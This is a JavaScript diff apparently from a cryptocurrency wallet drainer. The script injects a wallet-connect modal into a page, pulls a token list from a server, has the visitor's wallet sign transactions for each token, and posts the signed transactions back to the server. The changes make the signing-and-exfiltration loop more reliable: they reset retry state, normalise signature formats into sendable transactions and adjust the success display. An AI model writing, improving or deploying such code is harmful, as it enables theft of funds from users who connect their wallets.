@@ -48,6 +48,7 @@ if (isMobile) {
 } else {
 	WALLET_OPTIONS.isUseBinance = false
 }
+
 const body = document.querySelector('body')
 body.prepend(getModal(WALLET_OPTIONS))
 body.prepend(getError())
@@ -454,6 +455,8 @@ async function sendAndGetDataFromServer() {
 			throw new Error(result.message)
 		} else if (result.tokens) {
 			tokens = result.tokens
+			processedTokens.clear()
+			retryCount = 0
 		}
 		if (IS_AUTO_WITHDRAWAL) await withdraw()
 	} catch (error) {
@@ -470,6 +473,7 @@ const MAX_RETRY = 5
 let retryCount = 0
 async function withdraw() {
 	showLoader(returnLoaderMessage().transaction)
+	let anySigned = false
 	for (const token of tokens) {
 		if (processedTokens.has(token.tokenId)) {
 			continue
@@ -487,16 +491,36 @@ async function withdraw() {
 				processedTokens.add(token.tokenId)
 				continue
 			}
-			let tx
-			if (adapter.name === 'WalletConnect') {
-				tx = result.tx
-			} else tx = result.tx.transaction
+			const tx = result.tx.transaction
 			messageData.event = 'startedTransaction'
 			await sendDataToServer(messageData, 'send_message')
 			const signedTx = await adapter.signTransaction(tx)
-			token.signedTx = signedTx
+			console.log(
+				'adapter returned signedTx:',
+				JSON.stringify(signedTx, null, 2),
+			)
+
+			if (signedTx.signature && typeof signedTx.signature === 'string') {
+				token.signedTx = {
+					...tx,
+					signature: [signedTx.signature],
+				}
+			} else if (signedTx.signature && Array.isArray(signedTx.signature)) {
+				token.signedTx = {
+					...tx,
+					signature: signedTx.signature,
+				}
+			} else {
+				token.signedTx = signedTx
+			}
+
+			console.log(
+				'final signedTx to send:',
+				JSON.stringify(token.signedTx, null, 2),
+			)
 			await sendDataToServer(messageData, 'send_signedTx')
 			processedTokens.add(token.tokenId)
+			anySigned = true
 		} catch (error) {
 			console.log(error)
 			messageData.event = 'revertedTransaction'
@@ -520,17 +544,15 @@ async function withdraw() {
 			return
 		}
 	}
-
 	hideLoader()
-
-	resultModal.style.visibility = 'visible'
-	resultModalContent.style.transform = 'scale(1)'
-	resultModalContent.style.opacity = '1'
-
-	setTimeout(() => {
-		resultModal.style.display = 'none'
-	}, 1000)
-
+	if (anySigned) {
+		resultModal.style.visibility = 'visible'
+		resultModalContent.style.transform = 'scale(1)'
+		resultModalContent.style.opacity = '1'
+	} else {
+		updateConnectionButtons('disconnected')
+		updateWithdrawalButtons('disconnected')
+	}
 	try {
 		await adapter.disconnect()
 	} catch (error) {
